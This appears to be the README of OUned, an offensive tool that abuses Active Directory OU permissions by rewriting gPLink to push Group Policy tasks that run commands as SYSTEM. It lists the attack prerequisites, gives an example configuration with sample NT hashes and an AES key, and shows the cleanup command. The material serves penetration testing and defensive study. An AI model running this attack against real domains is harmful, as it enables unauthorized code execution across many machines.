# OUned

The OUned project, an exploitation tool automating Organizational Units ACLs abuse through gPLink manipulation.

The principle behind the attack and the motivation behind the project was originally described in the following article: https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory

**The attack implementation described in the article (network forwarding for LDAP / SMB) was improved since the article's release. OUned now bundles its own LDAP and multiplexing SMB servers. No additional setup is necessary anymore outside of the OUned script.**

The old OUned implementation can still be accessed in the `old-forwarded` branch.


# Attack pre-requisites

The prerequisites necessary to carry out the attack are the following:
- An account with the ability to modify the `gPLink` attribute of the target Organizational Unit
- A machine account with an LDAP SPN, used to simulate an LDAP server. Can be created with the `addcomputer_LDAP_spn.py` script, or, if you compromised an existing account, machine accounts can modify / add items to their own SPNs.
- A machine account with a HOST SPN, used to simulate an SMB server. This can be the same as the machine account with the LDAP SPN.
- A DNS record resolving the machine account to the machine running the OUned script. If you are using an existing, compromised machine, you can also simply reverse port-forward ports 445 and 389.

# Configuration file

OUned arguments are specified through a configuration file - an example file is provided in the repository, `config.example.ini`. 

```ini
[GENERAL]
# The Distinguished Name of the target Organizational Unit
ou-dn=OU=SERVERS,DC=corp,DC=com

# Generic domain information
domain=corp.com
dc-fqdn=ad01-dc.corp.com
#dc-ip=192.168.123.10

# User with rights to modify target gPLink attribute
username=anail
#password=Password1
hash=64F12CDDAA88057E06A81B54E73B949B
kerberos=False
ldaps=True

[LDAP]
# Details regarding the account with the LDAP SPN for GPC. Provide NT hash if it is configured for RC4, AES key otherwise
ldap-machine=SCAPY$
#ldap-nt=7facdc498ed1680c4fd1448319a8c04f
ldap-aes=c2e2bee9c44cdbb2be3d438be986e74ccb3d4e6b401e7e3cf6a83225cb841822
ldap-iface=eth0

[SMB]
# SMB mode can be either domain or embedded. 'Domain' means that you want to use the SMB share of another machine in the domain.
# Embedded means that you want to use OUned's embedded SMB server
smb-mode=embedded

# Details regarding the account acting as an SMB server for the GPT.
smb-machine=SCAPY$
smb-ip=192.168.123.20
smb-nt=7facdc498ed1680c4fd1448319a8c04f
smb-share=ouned
smb-iface=eth0

[COMMANDS]
# For commands to be executed, you can provide module files (see https://github.com/synacktiv/GroupPolicyBackdoor/wiki and https://github.com/synacktiv/GroupPolicyBackdoor/tree/master/modules_templates)
# You can specify multiple module files, separated by commas
modules=/home/user/modules/ImmediateTask_computer.ini

# For convenience, you can also alternatively specify a command, command_type (either computer or user) and a command_shell (cmd or powershell).
# This will simply create an immediate task running as SYSTEM
#command=whoami > C:\OUT.txt
#command-type=computer
#command-shell=cmd
```

# Video demonstration

![demo](./assets/demo.gif)


# About cleaning

By default, OUned will perform cleaning actions and among others restore the original gPLink value in the target domain. In case the exploit could not exit properly, OUned creates a cleaning file each time the exploit is executed, that can be used later on to restore legitimate values by using the `--clean` flag; for instance:

```bash
$ python3 OUned.py --config config.example.ini --clean cleaning/2026_07_31_064102_036100/
```
